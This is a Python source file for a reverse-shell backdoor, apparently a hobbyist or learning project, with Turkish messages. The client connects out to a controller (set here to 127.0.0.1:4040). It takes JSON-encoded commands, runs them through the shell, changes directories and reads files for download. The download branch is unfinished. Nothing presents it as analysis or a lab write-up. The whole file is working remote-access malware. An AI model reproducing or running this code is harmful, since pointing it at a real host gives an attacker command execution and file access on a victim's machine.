import socket
import json
import subprocess
import os

# def execute_command(command):
#     return subprocess.check_output(command, shell=True)

class ihsanbey:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode("utf-8")
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))


    def reliable_recieve(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode("utf-8"))
            except ValueError: 
                continue

    def change_dir(self, path):
         os.chdir(path)
         return "[+] Changing working directory to: " + path


    def execute_command(self, command):
        try:
            if os.path.isdir(command):  
                return "beyler" 
            else:
                return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return str(e).encode('utf-8')
        except Exception as e:
            return ("Beklenmedik bir hata oluştu: " + str(e)).encode('utf-8')


    def read_file(self, path):
        with open(path, "rb+") as file:
            return file.read()
            

    def run(self):
        while True:
            command = self.reliable_recieve()
            
            if command == "!stop":
                self.connection.close()
                exit()

            elif command.startswith("cd "):
                path = " ".join(command.split(" ")[1:])
                try: 
                    command_result =  self.change_dir(path)
                    self.reliable_send(command_result)
                except FileNotFoundError:
                    return print("Eksik dosya ismi / dosya bulunamadı")
            elif command.startswith("download "):
                wanted_file_command = command.split(" ")
                print(wanted_file_command)
                command_result = self.read_file(wanted_file_command[1])
            else:
                try:    
                    resultt = self.execute_command(command.encode("utf-8"))
                    self.reliable_send(resultt.decode("utf-8"))
                except BrokenPipeError:
                    print("Karşı Taraftaki Bağlantı kesildi")
                    break
            # except TypeError:
            #     print("type error")
            #     break


                



new_door = ihsanbey("127.0.0.1", 4040)
new_door.run()



